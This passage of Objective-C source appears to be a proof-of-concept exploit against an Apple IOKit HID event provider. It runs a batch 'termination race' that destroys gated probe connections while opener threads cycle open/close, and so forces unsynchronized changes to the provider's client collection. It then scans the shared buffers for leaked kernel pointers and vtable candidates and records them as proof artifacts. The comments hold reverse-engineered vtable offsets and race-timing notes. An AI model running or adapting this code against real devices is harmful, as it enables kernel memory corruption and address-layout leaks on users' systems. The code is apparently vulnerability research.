                                    memcpy(firstCrossClientSample, current, sampleLen);
                                }

                                // Use the aggressive scanner to find first pointer
                                if (leaks.count > 0) {
                                    NSDictionary *firstLeak = leaks[0];
                                    uint64_t leakValue = 0;
                                    sscanf([firstLeak[@"value"] UTF8String], "0x%llx", &leakValue);
                                    atomic_store(&firstCrossClientPtrOffset, [firstLeak[@"offset"] intValue]);
                                    firstCrossClientPtr = leakValue;
                                } else {
                                    // Fallback to old method if aggressive scan didn't find anything
                                    for (size_t off = 4; off + 8 <= sampleLen; off += 8) {
                                        uint64_t ptrVal = 0;
                                        memcpy(&ptrVal, current + off, sizeof(ptrVal));
                                        if ([self isLikelyKernelPointerValue:ptrVal]) {
                                            if (atomic_load(&firstCrossClientPtrOffset) == -1) {
                                                atomic_store(&firstCrossClientPtrOffset, (int)off);
                                                firstCrossClientPtr = ptrVal;
                                                break;
                                            }
                                        }
                                    }
                                }

                                [self appendLog:[NSString stringWithFormat:
                                    @"  First cross-client misdelivery captured from conn[%d], evtSize=%u, len=%zu, leaks=%lu",
                                    i, evtSz, sampleLen, (unsigned long)leaks.count]];
                            }
                        }
                        memcpy(auxPreSnaps[i], current, sampleLen);
                    }
                    free(current);
                }
                localChecks++;
                usleep(500); // 0.5ms between scans — lower overhead than tight loop
            }
            atomic_store(&crossClientChecks, (int)localChecks);
            dispatch_group_leave(group);
        });
    }

    // Wait for stress duration, then signal stop
    dispatch_time_t deadline = dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kStressDuration * NSEC_PER_SEC));
    long waitResult = dispatch_group_wait(group, deadline);
    if (waitResult != 0) {
        atomic_store(&stopFlag, 1);
        [self appendLog:@"  Stress duration elapsed, signaling stop..."];
        dispatch_time_t drainTimeout = dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC);
        long drainResult = dispatch_group_wait(group, drainTimeout);
        if (drainResult != 0) {
            [self appendLog:@"  WARNING: Workers did not drain within grace period."];
        }
    }

    // ---- Release multi-conn client slots before termination race ----
    // The provider has a maximum client count (~16). The 15 multi-conn connections
    // from setup are still holding "open" slots. Close them (sel 1) to free slots
    // for the termination race's probe connections. The IOKit connections stay alive —
    // the caller re-syncs conn[0] after we return.
    {
        int released = 0;
        for (int i = 0; i < connCount; i++) {
            uint64_t closeScalar = 0;
            kern_return_t ckr = sIOConnectCallMethod(connections[i], kSelectorClose,
                &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
            if (ckr == KERN_SUCCESS) released++;
        }
        [self appendLog:[NSString stringWithFormat:
            @"\n  Released %d/%d multi-conn client slots for termination race", released, connCount]];
    }

    // ---- Dedicated Termination Race Phase (Batch Pre-Gating) ----
    //
    // IDA vtable analysis (sub_FFFFFFF005AD1514, vtable+0x560):
    //   clientClose calls self->terminate(0) — ASYNCHRONOUS.
    //   didTerminate fires LATER on the global IOKit termination thread.
    //   didTerminate → close handler (NO command gate) → closeForClient.
    //
    // Previous unsynchronized approach: terminator + opener threads competing.
    //   Problem: terminator's IOServiceOpen + sel 0 gate contends with 3 openers
    //   for the provider's work loop. Result: only 15 probe teardowns in 15 seconds.
    //
    // REVISED APPROACH — Batch Pre-Gating:
    //   Phase 1 (pre-gate): Pause openers. Create + gate a batch of N probe connections.
    //     No work loop contention → fast probe connection setup.
    //   Phase 2 (race): Resume openers. Rapidly mach_port_destroy all N probe connections.
    //     Each teardown → clientClose → terminate(0) → async didTerminate.
    //     didTerminate's closeForClient runs on termination thread (NO gate).
    //     Openers continuously call openForClient (through command gate).
    //     closeForClient modifies client collection WHILE openForClient iterates it.
    //
    //   NOTE: On affected builds, this test may trigger unexpected behavior.
    if (raceService != MACH_PORT_NULL) {
        [self appendLog:@"\n  ---- Dedicated Termination Race (Batch Pre-Gating) ----"];
        [self appendLog:@"  Strategy: pre-gate probe batches → rapid-fire teardown during opener activity"];

        static const NSTimeInterval kTermRaceDuration = 15.0;
        enum { kBatchSize = 16, kNumOpeners = 3, kRaceWindowUs = 80000 };

        const char *raceXml = kOpenPropertiesXML;
        const size_t raceXmlLen = strlen(raceXml) + 1;

        // Pre-allocate opener connections and open them initially
        io_connect_t openerConns[kNumOpeners];
        int openerCount = 0;
        for (int p = 0; p < kNumOpeners; p++) {
            openerConns[p] = MACH_PORT_NULL;
            kern_return_t pkr = sIOServiceOpen(raceService, mach_task_self_, 2, &openerConns[p]);
            if (pkr != KERN_SUCCESS || openerConns[p] == MACH_PORT_NULL) continue;
            // Pre-open: put connection into "opened" state so the race loop
            // can start immediately with close→open (which calls openForClient)
            uint64_t scalar = 0;
            kern_return_t okr = sIOConnectCallMethod(openerConns[p], kSelectorOpen,
                &scalar, 1, raceXml, raceXmlLen, NULL, NULL, NULL, NULL);
            if (okr == KERN_SUCCESS) {
                openerCount++;
            } else {
                sIOServiceClose(openerConns[p]);
                mach_port_deallocate(mach_task_self(), openerConns[p]);
                openerConns[p] = MACH_PORT_NULL;
            }
        }
        [self appendLog:[NSString stringWithFormat:
            @"  Openers: %d (pre-opened). Batch size: %d. Race window: %dμs",
            openerCount, kBatchSize, kRaceWindowUs]];

        if (openerCount == 0) {
            [self appendLog:@"  WARNING: No opener connections — termination race skipped"];
        } else {

        // Shared state between main thread and opener threads
        __block volatile int opPause = 1;  // 1 = paused (spin-wait), 0 = running
        __block volatile int opStop = 0;   // 1 = terminate threads
        __block volatile int totalOpenerCycles = 0;  // multi-writer
        __block volatile int totalOpenerOpenOk = 0;  // multi-writer
        __block volatile int totalOpenerOpenErr = 0;  // multi-writer
        __block volatile int lastOpenerErrCode = 0;  // diagnostic, race OK

        // Single-writer counters (main thread only)
        int totalProbesGated = 0;
        int totalProbesTornDown = 0;
        int totalGateFails = 0;
        int totalOpenFails = 0;
        int batchCount = 0;
        kern_return_t firstGateErr = 0; // diagnostic: first gate error code

        dispatch_group_t openerGroup = dispatch_group_create();

        // Launch opener threads — they start PAUSED (opPause=1)
        for (int o = 0; o < openerCount; o++) {
            io_connect_t oc = openerConns[o];
            dispatch_group_enter(openerGroup);
            dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
                uint64_t scalar = 0;
                uint32_t localCycles = 0;
                uint32_t localOk = 0;
                uint32_t localErr = 0;
                kern_return_t localLastErr = 0;

                while (!opStop) {
                    // Spin-wait when paused (during pre-gating)
                    while (opPause && !opStop) {
                        usleep(50);
                    }
                    if (opStop) break;

                    // Close current session (sel 1 → gated close handler)
                    uint64_t cs = 0;
                    (void)sIOConnectCallMethod(oc, kSelectorClose,
                        &cs, 1, NULL, 0, NULL, NULL, NULL, NULL);

                    // Re-open: sel 0 → command gate → openForClient
                    // openForClient iterates provider's client collection.
                    // THIS is the race target: didTerminate's closeForClient
                    // modifies the collection concurrently (no gate).
                    kern_return_t okr = sIOConnectCallMethod(oc, kSelectorOpen,
                        &scalar, 1, raceXml, raceXmlLen,
                        NULL, NULL, NULL, NULL);
                    if (okr == KERN_SUCCESS) {
                        localOk++;
                    } else {
                        localErr++;
                        localLastErr = okr;
                    }

                    localCycles++;
                }

                __sync_fetch_and_add(&totalOpenerCycles, (int)localCycles);
                __sync_fetch_and_add(&totalOpenerOpenOk, (int)localOk);
                __sync_fetch_and_add(&totalOpenerOpenErr, (int)localErr);
                if (localLastErr != 0) lastOpenerErrCode = (int)localLastErr;
                dispatch_group_leave(openerGroup);
            });
        }

        NSDate *raceStart = [NSDate date];

        while ([[NSDate date] timeIntervalSinceDate:raceStart] < kTermRaceDuration) {
            // ---- Phase 1: Pre-gate a batch of probe connections (openers PAUSED) ----
            // No work loop contention → probe setup is fast
            opPause = 1;
            __sync_synchronize();
            usleep(1000); // Let openers drain into spin-wait

            io_connect_t probeConns[kBatchSize];
            int gatedCount = 0;

            for (int v = 0; v < kBatchSize; v++) {
                probeConns[v] = MACH_PORT_NULL;
                kern_return_t vkr = sIOServiceOpen(raceService, mach_task_self_, 2, &probeConns[v]);
                if (vkr != KERN_SUCCESS || probeConns[v] == MACH_PORT_NULL) {
                    totalOpenFails++;
                    continue;
                }
                uint64_t scalar = 0;
                kern_return_t gkr = sIOConnectCallMethod(probeConns[v], kSelectorOpen,
                    &scalar, 1, raceXml, raceXmlLen,
                    NULL, NULL, NULL, NULL);
                if (gkr != KERN_SUCCESS) {
                    if (totalGateFails == 0) firstGateErr = gkr;
                    totalGateFails++;
                    sIOServiceClose(probeConns[v]);
                    mach_port_deallocate(mach_task_self(), probeConns[v]);
                    probeConns[v] = MACH_PORT_NULL;
                    continue;
                }
                gatedCount++;
            }

            totalProbesGated += gatedCount;

            if (gatedCount == 0) {
                [self appendLog:@"  WARNING: Batch produced 0 gated probe connections"];
                usleep(10000);
                continue;
            }

            // ---- Phase 2: Resume openers, then rapid-fire teardown all probe connections ----
            // Openers re-enter their close→open loops, continuously calling
            // openForClient through the command gate.
            opPause = 0;
            __sync_synchronize();
            usleep(2000); // 2ms: let openers re-enter their loops

            // Rapid teardown: mach_port_destroy is a Mach trap — no gate needed.
            // Each triggers: clientClose → terminate(0) → async didTerminate
            // didTerminate fires on the termination thread → close handler (NO gate)
            // → closeForClient modifies provider's client collection without synchronization
            for (int v = 0; v < kBatchSize; v++) {
                if (probeConns[v] == MACH_PORT_NULL) continue;
                mach_port_destroy(mach_task_self(), probeConns[v]);
                totalProbesTornDown++;
            }

            // Race window: N didTerminate callbacks fire asynchronously while
            // openers continuously call openForClient through the command gate.
            // closeForClient (termination thread) vs openForClient (work loop)
            // both access the provider's client collection without synchronization.
            usleep(kRaceWindowUs);

            batchCount++;
        }

        // Stop openers
        opStop = 1;
        opPause = 0; // Unpause so they see the stop flag
        __sync_synchronize();

        dispatch_time_t drainTimeout = dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC);
        long drainResult = dispatch_group_wait(openerGroup, drainTimeout);
        if (drainResult != 0) {
            [self appendLog:@"  WARNING: Opener threads did not drain in time."];
        }

        // Cleanup opener connections
        for (int p = 0; p < kNumOpeners; p++) {
            if (openerConns[p] == MACH_PORT_NULL) continue;
            uint64_t cs = 0;
            (void)sIOConnectCallMethod(openerConns[p], kSelectorClose,
                &cs, 1, NULL, 0, NULL, NULL, NULL, NULL);
            (void)sIOServiceClose(openerConns[p]);
            (void)mach_port_deallocate(mach_task_self(), openerConns[p]);
        }

        // Store results for summary section
        atomic_store(&terminationRaceIters, totalProbesTornDown);
        atomic_store(&terminationBothSucceeded, (int)totalOpenerCycles);
        atomic_store(&terminationMigErrors, totalGateFails);
        atomic_store(&terminationSel1Errors, totalOpenFails);
        atomic_store(&terminationSvcCloseErrors, (int)totalOpenerOpenErr);

        NSTimeInterval elapsed = [[NSDate date] timeIntervalSinceDate:raceStart];
        [self appendLog:[NSString stringWithFormat:
            @"  TermRace complete: %d batches, %d probes gated, %d torn down in %.1fs",
            batchCount, totalProbesGated, totalProbesTornDown, elapsed]];
        [self appendLog:[NSString stringWithFormat:
            @"  Throughput: %.1f teardowns/s (vs ~1/s in unsynchronized approach)",
            totalProbesTornDown / fmax(elapsed, 0.001)]];
        [self appendLog:[NSString stringWithFormat:
            @"  Pre-gate errors: openFail=%d gateFail=%d (first err: 0x%X)",
            totalOpenFails, totalGateFails, (unsigned)firstGateErr]];
        [self appendLog:[NSString stringWithFormat:
            @"  Opener stats: %d cycles, %d open-ok, %d open-err",
            (int)totalOpenerCycles, (int)totalOpenerOpenOk, (int)totalOpenerOpenErr]];
        if (lastOpenerErrCode != 0) {
            [self appendLog:[NSString stringWithFormat:
                @"  Opener last error: 0x%X", (unsigned)lastOpenerErrCode]];
        }
        if ((int)totalOpenerOpenErr > 0 && (int)totalOpenerCycles > 0) {
            double errPct = 100.0 * (int)totalOpenerOpenErr / (int)totalOpenerCycles;
            [self appendLog:[NSString stringWithFormat:
                @"  Opener error rate: %.1f%%", errPct]];
        }

        } // end if (openerCount > 0)
    } else {
        [self appendLog:@"  WARNING: No provider service port — termination race skipped"];
    }

    // ---- Post-stress mapped buffer comparison ----
    uint8_t postStressSnap[64];
    memset(postStressSnap, 0, sizeof(postStressSnap));
    memcpy(postStressSnap, (const void *)(uintptr_t)mappedAddr, preStressLen);

    uint32_t stressDiffs = 0;
    for (size_t i = 0; i < preStressLen; i++) {
        if (preStressSnap[i] != postStressSnap[i]) stressDiffs++;
    }

    // Collect results
    int finalAnomalies = atomic_load(&anomalyCount);
    int finalSizeAnomalies = atomic_load(&sizeAnomalyCount);
    int finalMigErrors = atomic_load(&migErrorCount);
    int finalReaderIters = atomic_load(&readerIterations);
    int finalLifecycleIters = atomic_load(&lifecycleIterations);
    int finalChurnIters = atomic_load(&churnIterations);
    int finalCloseErrs = atomic_load(&lifecycleCloseErrors);
    int finalOpenErrs = atomic_load(&lifecycleOpenErrors);
    int finalChurnCloseErrs = atomic_load(&churnCloseErrors);
    int finalChurnOpenErrs = atomic_load(&churnOpenErrors);
    int finalCrossClient = atomic_load(&crossClientHits);
    int finalCrossClientChecks = atomic_load(&crossClientChecks);
    int finalPrimaryScanCount = atomic_load(&primaryScanCount);
    int finalPrimaryLeakCount = atomic_load(&primaryLeakCount);
    self.proofPrimaryScanCount = finalPrimaryScanCount;
    self.proofPrimaryLeakCount = finalPrimaryLeakCount;
    int finalTermRaceIters = atomic_load(&terminationRaceIters);
    int finalTermBothOk = atomic_load(&terminationBothSucceeded);
    int finalTermMigErrs = atomic_load(&terminationMigErrors);
    int finalTermSel1Errs = atomic_load(&terminationSel1Errors);
    int finalTermSvcCloseErrs = atomic_load(&terminationSvcCloseErrors);

    [self appendLog:[NSString stringWithFormat:
        @"\nStress results: reader=%d lifecycle=%d churn=%d termRace=%d iterations",
        finalReaderIters, finalLifecycleIters, finalChurnIters, finalTermRaceIters]];
    [self appendLog:[NSString stringWithFormat:
        @"Primary buffer scans: %d scans performed, %d kernel pointer leaks detected",
        finalPrimaryScanCount, finalPrimaryLeakCount]];
    [self appendLog:[NSString stringWithFormat:
        @"  Anomalies: unexpected_kr=%d sizeAnomaly=%d migErrors=%d",
        finalAnomalies, finalSizeAnomalies, finalMigErrors]];
    [self appendLog:[NSString stringWithFormat:
        @"  Lifecycle errors: close=%d open=%d (of %d cycles)",
        finalCloseErrs, finalOpenErrs, finalLifecycleIters]];
    [self appendLog:[NSString stringWithFormat:
        @"  Churn errors: close=%d open=%d (of %d cycles)",
        finalChurnCloseErrs, finalChurnOpenErrs, finalChurnIters]];
    [self appendLog:[NSString stringWithFormat:
        @"  Cross-client monitor: %d buffer changes detected in %d scans",
        finalCrossClient, finalCrossClientChecks]];
    [self appendLog:[NSString stringWithFormat:
        @"  Termination race: %d probes torn down, %d opener cycles (batch pre-gating)",
        finalTermRaceIters, finalTermBothOk]];
    [self appendLog:[NSString stringWithFormat:
        @"  TermRace errors: probeFails=%d teardownErrs=%d openerErrs=%d",
        finalTermSel1Errs, finalTermMigErrs, finalTermSvcCloseErrs]];
    [self appendLog:[NSString stringWithFormat:
        @"  Mapped buffer: %u bytes changed during stress", stressDiffs]];

    // ---- Analysis ----
    if (finalCrossClient > 0) {
        [self appendLog:@"\n  ** SIGNAL: Cross-client data misdirection detected. **"
                         "\n  Auxiliary connection buffers received event data they did not request."
                         "\n  This indicates the provider wrote to a different client's buffer,"
                         "\n  consistent with ClientObject reference invalidation during the synchronization gap."];
    }
    if (finalAnomalies > 0 || finalMigErrors > 0) {
        [self appendLog:@"  SIGNAL: Unexpected return codes or MIG errors during lifecycle stress."];
    }
    if (finalSizeAnomalies > 0) {
        [self appendLog:@"  SIGNAL: eventSize exceeded mapped region bounds — possible invalidated size field."];
    }
    if (finalOpenErrs > 0) {
        [self appendLog:[NSString stringWithFormat:
            @"  NOTE: %d%% of lifecycle opens failed — connection may have been in inconsistent state.",
            (finalLifecycleIters > 0) ? (finalOpenErrs * 100 / finalLifecycleIters) : 0]];
    }
    if (finalTermBothOk > 0 && finalTermRaceIters > 0) {
        [self appendLog:[NSString stringWithFormat:
            @"\n  ** Termination race: %d probes torn down while %d opener cycles ran. **"
             "\n  Analysis: clientClose (vtable+0x560) calls self->terminate(0) [ASYNC]."
             "\n  terminate() queues didTerminate on IOKit termination thread."
             "\n  didTerminate calls close handler DIRECTLY (no gate) → closeForClient."
             "\n  Opener threads call openForClient (gated, work loop)."
             "\n  closeForClient (termination thread) vs openForClient (work loop)"
             "\n  operate on provider's client collection at +504/+512 without mutual exclusion."
             "\n  If no fault: timing window may be too narrow, or provider"
             "\n  serialization at a lower level prevents the overlap.",
             finalTermRaceIters, finalTermBothOk]];
    }
    if (finalCrossClient == 0 && finalAnomalies == 0 && finalSizeAnomalies == 0 &&
        finalMigErrors == 0 && stressDiffs == 0 && finalTermBothOk == 0) {
        [self appendLog:@"  No lifecycle desynchronization signals detected."
                         "\n  Possible causes: provider serializes all paths internally (workloop lock),"
                         "\n  synchronization gap too small for current timing, or allocation reuse did not occur."];
    }

    self.proofCrossClientEvents = finalCrossClient;
    self.proofCrossClientChecks = finalCrossClientChecks;
    self.proofTerminationProbes = finalTermRaceIters;
    self.proofTerminationOpenCycles = finalTermBothOk;
    self.proofCrossClientSignal = (finalCrossClient > 0);
    self.proofTermRaceActive = (finalTermRaceIters > 0 || finalTermBothOk > 0);
    if (atomic_load(&firstCrossClientSampleSet) == 1) {
        self.proofFirstCrossClientConn = atomic_load(&firstCrossClientConn);
        self.proofFirstCrossClientEventSize = (uint32_t)atomic_load(&firstCrossClientEventSize);
        self.proofFirstCrossClientHex = [self hexPreview:firstCrossClientSample
                                                 length:MIN((size_t)kCrossClientSampleBytes, (size_t)64)];
        int ptrOffset = atomic_load(&firstCrossClientPtrOffset);
        if (ptrOffset >= 0 && firstCrossClientPtr != 0) {
            self.proofKernelPointerLeak = YES;
            self.proofKernelPointerSourceConn = self.proofFirstCrossClientConn;
            self.proofKernelPointerOffset = ptrOffset;
            self.proofKernelPointerValue = firstCrossClientPtr;
            self.proofKernelPointerHex = [self hexPreview:(uint8_t *)&firstCrossClientPtr length:sizeof(firstCrossClientPtr)];
        } else {
            self.proofKernelPointerLeak = NO;
            self.proofKernelPointerSourceConn = -1;
            self.proofKernelPointerOffset = -1;
            self.proofKernelPointerValue = 0;
            self.proofKernelPointerHex = nil;
        }
    } else {
        self.proofFirstCrossClientHex = nil;
        self.proofFirstCrossClientConn = -1;
        self.proofFirstCrossClientEventSize = 0;
        self.proofKernelPointerLeak = NO;
        self.proofKernelPointerValue = 0;
        self.proofKernelPointerOffset = -1;
        self.proofKernelPointerSourceConn = -1;
        self.proofKernelPointerHex = nil;
    }

    if (auxPreSnaps) {
        free(auxPreSnaps);
        auxPreSnaps = NULL;
    }
    if (auxSampleLens) {
        free(auxSampleLens);
        auxSampleLens = NULL;
    }
    if (firstCrossClientSample) {
        free(firstCrossClientSample);
        firstCrossClientSample = NULL;
    }
    [self appendLog:@"====== Sub-phase B Complete ======"];
}

#pragma mark - Sub-phase C: Post-Stress Structural Analysis

- (void)runPostStressStructuralAnalysis:(io_connect_t)connection
                    mappedAddr:(mach_vm_address_t)mappedAddr
                    mappedSize:(mach_vm_size_t)mappedSize
                   preSnapshot:(NSData *)preSnapshot {
    [self appendLog:@"\n====== Sub-phase C: Post-Stress Structural Analysis ======"];

    const uint8_t *base = (const uint8_t *)(uintptr_t)mappedAddr;
    size_t totalSize = MIN((size_t)mappedSize, (size_t)kMappedProbeMaxBytes);

    // Take post-stress snapshot (first 64 bytes)
    size_t snapLen = MIN((size_t)64, totalSize);
    uint8_t postSnap[64];
    memset(postSnap, 0, sizeof(postSnap));
    memcpy(postSnap, base, snapLen);

    // Compare pre vs post first 64 bytes
    const uint8_t *preBytes = (const uint8_t *)preSnapshot.bytes;
    size_t preLen = MIN((size_t)preSnapshot.length, (size_t)64);
    size_t cmpLen = MIN(preLen, snapLen);

    uint32_t diffCount = 0;
    NSMutableString *diffReport = [NSMutableString string];
    for (size_t i = 0; i < cmpLen; i++) {
        if (preBytes[i] != postSnap[i]) {
            diffCount++;
            if (diffCount <= 16) {
                [diffReport appendFormat:@"  +0x%02zx: 0x%02x -> 0x%02x\n", i, preBytes[i], postSnap[i]];
            }
        }
    }

    [self appendLog:[NSString stringWithFormat:@"Pre/post snapshot diff: %u bytes changed out of %zu", diffCount, cmpLen]];
    if (diffCount > 0 && diffReport.length > 0) {
        [self appendLog:diffReport];
        if (diffCount > 16) {
            [self appendLog:[NSString stringWithFormat:@"  ... and %u more differences", diffCount - 16]];
        }
    }

    // Check type field at +12 pre vs post
    if (cmpLen >= 16) {
        uint32_t preType = 0, postType = 0;
        memcpy(&preType, preBytes + 12, sizeof(preType));
        memcpy(&postType, postSnap + 12, sizeof(postType));
        [self appendLog:[NSString stringWithFormat:@"Type field at +12: pre=0x%08x post=0x%08x %@",
                         preType, postType, (preType != postType) ? @"CHANGED" : @"unchanged"]];
    }

    // Check if first qword now looks like a kernel address pattern
    if (snapLen >= 8) {
        uint64_t firstQword = 0;
        memcpy(&firstQword, postSnap, sizeof(firstQword));
        uint32_t hi32 = (uint32_t)(firstQword >> 32);
        if (hi32 == 0xFFFFFE00 || (firstQword >> 36) == 0xFFFFFE0 || hi32 == 0xFFFFFF80) {
            [self appendLog:[NSString stringWithFormat:
                @"  SIGNAL: First qword (0x%016llx) resembles an indirect call target — possible allocation reuse.",
                firstQword]];
        }
    }

    // Aggressive kernel pointer scan of entire mapped buffer post-stress
    [self appendLog:@"\n--- Aggressive Kernel Pointer Scan (Post-Stress) ---"];
    NSArray<NSDictionary *> *foundPointers = [self scanForKernelPointers:base
                                                                  length:totalSize
                                                              maxResults:50
                                                               connIndex:0];

    if (foundPointers.count > 0) {
        [self appendLog:[NSString stringWithFormat:@"*** FINDING: Found %lu potential kernel pointer patterns in mapped buffer ***",
                         (unsigned long)foundPointers.count]];

        // Log first 10 in detail
        NSUInteger detailCount = MIN(10, foundPointers.count);
        for (NSUInteger i = 0; i < detailCount; i++) {
            NSDictionary *ptr = foundPointers[i];
            [self appendLog:[NSString stringWithFormat:
                @"  [%lu] offset=0x%@ value=%@ align=%@ inArray=%@ ctx=%@",
                (unsigned long)i,
                ptr[@"offset"],
                ptr[@"value"],
                ptr[@"alignment"],
                ptr[@"inArray"],
                ptr[@"context"]]];
        }

        if (foundPointers.count > 10) {
            [self appendLog:[NSString stringWithFormat:@"  ... and %lu more kernel pointer candidates",
                             (unsigned long)(foundPointers.count - 10)]];
        }

        // Store first leak for PoC artifact
        if (!self.proofKernelPointerLeak) {
            NSDictionary *firstLeak = foundPointers[0];
            uint64_t leakValue = 0;
            sscanf([firstLeak[@"value"] UTF8String], "0x%llx", &leakValue);
            self.proofKernelPointerLeak = YES;
            self.proofKernelPointerValue = leakValue;
            self.proofKernelPointerOffset = [firstLeak[@"offset"] intValue];
            self.proofKernelPointerSourceConn = 0;
            self.proofKernelPointerHex = [self hexPreview:(uint8_t *)&leakValue length:sizeof(leakValue)];
        }
    } else {
        [self appendLog:@"  No kernel pointer patterns detected in primary buffer."];
    }

    // Call copyEvent 10 times post-stress and analyze each capture
    [self appendLog:@"\n--- Post-stress copyEvent captures ---"];
    uint32_t captureAnomalies = 0;
    uint32_t newKernPtrs = 0;

    for (int i = 0; i < 10; i++) {
        uint64_t scalarsIn[2] = { 0, 1 };
        uint8_t structOut[256];  // Increased buffer size
        size_t structOutSize = sizeof(structOut);
        kern_return_t kr = sIOConnectCallMethod(
            connection, kSelectorCopyEvent,
            scalarsIn, 2, NULL, 0,
            NULL, NULL, structOut, &structOutSize
        );

        uint32_t eventSize = 0;
        if (totalSize >= 4) {
            memcpy(&eventSize, base, sizeof(eventSize));
        }

        // Check payload size sanity (buffer is [len][payload]).
        BOOL sizeOk = (eventSize > 0 && (uint64_t)eventSize + 4ull <= (uint64_t)mappedSize);

        // Check type field at +12 for known IOHIDEvent types (generally < 0x40)
        uint32_t typeField = 0;
        if (totalSize >= 16) {
            memcpy(&typeField, base + 12, sizeof(typeField));
        }
        uint32_t eventType = typeField & 0xFF;
        BOOL typeOk = (eventType < 0x40);

        // Aggressive scan of mapped buffer after each copyEvent
        size_t scanLimit = MIN(totalSize, (size_t)eventSize + 4);
        NSArray<NSDictionary *> *bufferLeaks = [self scanForKernelPointers:base
                                                                    length:scanLimit
                                                                maxResults:10
                                                                 connIndex:0];

        // Also scan the struct output buffer
        NSArray<NSDictionary *> *structLeaks = [self scanForKernelPointers:structOut
                                                                    length:structOutSize
                                                                maxResults:10
                                                                 connIndex:-1];

        uint32_t localKernPtrs = (uint32_t)(bufferLeaks.count + structLeaks.count);

        if (!sizeOk || !typeOk || localKernPtrs > 0) {
            captureAnomalies++;
        }
        newKernPtrs += localKernPtrs;

        if (i < 3 || !sizeOk || !typeOk || localKernPtrs > 0) {
            [self appendLog:[NSString stringWithFormat:
                @"  capture[%d]: kr=0x%x size=%u(%@) type=0x%02x(%@) kernPtrs=%u (buf=%lu struct=%lu)",
                i, kr, eventSize, sizeOk ? @"ok" : @"ANOMALY",
                eventType, typeOk ? @"ok" : @"ANOMALY", localKernPtrs,
                (unsigned long)bufferLeaks.count, (unsigned long)structLeaks.count]];

            // Log any struct output leaks in detail
            if (structLeaks.count > 0) {
                [self appendLog:@"    *** KERNEL POINTER PATTERNS IN STRUCT OUTPUT:"];
                for (NSDictionary *leak in structLeaks) {
                    [self appendLog:[NSString stringWithFormat:@"      offset=0x%@ value=%@",
                                     leak[@"offset"], leak[@"value"]]];
                }
            }
        }
    }

    [self appendLog:[NSString stringWithFormat:@"Post-stress capture summary: anomalies=%u newKernPtrs=%u",
                     captureAnomalies, newKernPtrs]];

    if (captureAnomalies > 0 || newKernPtrs > 0) {
        [self appendLog:@"  *** SIGNAL: Post-stress captures show anomalies (size/type/pointer-like patterns). ***"];
    } else if (diffCount > 0) {
        [self appendLog:@"  INFO: Mapped buffer contents changed across phases (common for live event buffers)."];
    } else {
        [self appendLog:@"  No structural anomalies detected."];
    }

    [self appendLog:@"====== Sub-phase C Complete ======"];
}

#pragma mark - Sub-phase D: Post-Lifecycle Mapped Buffer Fingerprint

- (void)runPostLifecycleFingerprint:(io_connect_t)connection
                         mappedAddr:(mach_vm_address_t)mappedAddr
                         mappedSize:(mach_vm_size_t)mappedSize
                        preEntropy:(double)preEntropy
                           preHash:(uint64_t)preHash
                   primaryScanCount:(int)primaryScanCount
                   primaryLeakCount:(int)primaryLeakCount {
    [self appendLog:@"\n====== Sub-phase D: Post-Lifecycle Buffer Fingerprint ======"];

    int finalPrimaryScanCount = primaryScanCount;
    int finalPrimaryLeakCount = primaryLeakCount;

    const uint8_t *base = (const uint8_t *)(uintptr_t)mappedAddr;
    size_t totalSize = MIN((size_t)mappedSize, (size_t)kMappedProbeMaxBytes);

    // Compute post-stress hash of first 64 bytes (XOR-fold)
    size_t hashLen = MIN((size_t)64, totalSize);
    uint64_t postHash = 0;
    for (size_t i = 0; i < hashLen; i++) {
        postHash ^= ((uint64_t)base[i]) << ((i % 8) * 8);
    }

    BOOL hashChanged = (preHash != postHash);
    [self appendLog:[NSString stringWithFormat:@"Buffer fingerprint: preHash=0x%016llx postHash=0x%016llx %@",
                     preHash, postHash, hashChanged ? @"CHANGED" : @"unchanged"]];

    if (hashChanged) {
        [self appendLog:[NSString stringWithFormat:@"  Post-stress first 32 bytes: %@",
                         [self hexPreview:base length:MIN((size_t)32, hashLen)]]];
    }

    // Aggressive scan for kernel pointer-like values
    [self appendLog:@"\n--- Final Aggressive Kernel Pointer Scan ---"];
    NSArray<NSDictionary *> *finalPointers = [self scanForKernelPointers:base
                                                                  length:totalSize
                                                              maxResults:100
                                                               connIndex:0];

    uint32_t kernPtrCount = (uint32_t)finalPointers.count;

    if (kernPtrCount > 0) {
        [self appendLog:[NSString stringWithFormat:
            @"*** LIFECYCLE BOUNDARY ANOMALY: Mapped region contains %u kernel address pattern(s) post-stress. ***",
            kernPtrCount]];

        // Log first 10 detailed findings
        NSUInteger detailCount = MIN(10, finalPointers.count);
        for (NSUInteger i = 0; i < detailCount; i++) {
            NSDictionary *ptr = finalPointers[i];
            BOOL inArray = [ptr[@"inArray"] boolValue];
            [self appendLog:[NSString stringWithFormat:
                @"  [%lu] +0x%@ = %@ %@",
                (unsigned long)i,
                ptr[@"offset"],
                ptr[@"value"],
                inArray ? @"(in pointer array)" : @""]];
        }

        if (kernPtrCount > 10) {
            [self appendLog:[NSString stringWithFormat:@"  ... and %u more kernel address patterns", kernPtrCount - 10]];
        }

        // Look for vtable-like structures (multiple consecutive pointers)
        int consecutiveCount = 0;
        size_t lastOffset = 0;
        for (NSDictionary *ptr in finalPointers) {
            size_t offset = [ptr[@"offset"] unsignedLongValue];
            if (offset == lastOffset + 8) {
                consecutiveCount++;
                if (consecutiveCount == 3) {
                    [self appendLog:[NSString stringWithFormat:
                        @"  *** VTABLE CANDIDATE: Found 3+ consecutive kernel pointers starting at +0x%zx ***",
                        offset - 16]];
                }
            } else {
                consecutiveCount = 0;
            }
            lastOffset = offset;
        }
    } else {
        [self appendLog:@"  No kernel address patterns detected in final scan."];
    }

    // Compute and compare entropy
    double postEntropy = [self shannonEntropyForBytes:base length:totalSize];
    double entropyDelta = postEntropy - preEntropy;

    [self appendLog:[NSString stringWithFormat:@"Entropy: pre=%.4f post=%.4f delta=%+.4f",
                     preEntropy, postEntropy, entropyDelta]];

    if (fabs(entropyDelta) > 0.5) {
        [self appendLog:@"  SIGNAL: Significant entropy change — possible allocation reuse pattern."];
    }

    // Final summary
    [self appendLog:@"\n--- Lifecycle Boundary Test Summary ---"];
    [self appendLog:[NSString stringWithFormat:@"Hash changed: %@", hashChanged ? @"YES" : @"NO"]];
    [self appendLog:[NSString stringWithFormat:@"Kernel address patterns found: %u", kernPtrCount]];
